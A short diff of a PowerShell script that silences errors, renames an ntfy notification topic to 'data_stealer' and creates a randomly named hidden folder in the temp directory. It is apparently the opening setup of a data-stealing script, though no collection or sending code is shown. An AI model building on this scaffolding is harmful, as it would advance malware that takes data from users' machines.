@@ -1,6 +1,6 @@
 $ErrorActionPreference = "SilentlyContinue"
 # Pick a random secret name for your ntfy topic
-$topic = "luke_phantom_2026" 
+$topic = "data_stealer" 
 
 # 1. Create Workspace
 $dir = "$env:TEMP\$( -join ((65..90) | Get-Random -Count 8 | % {[char]$_}))"
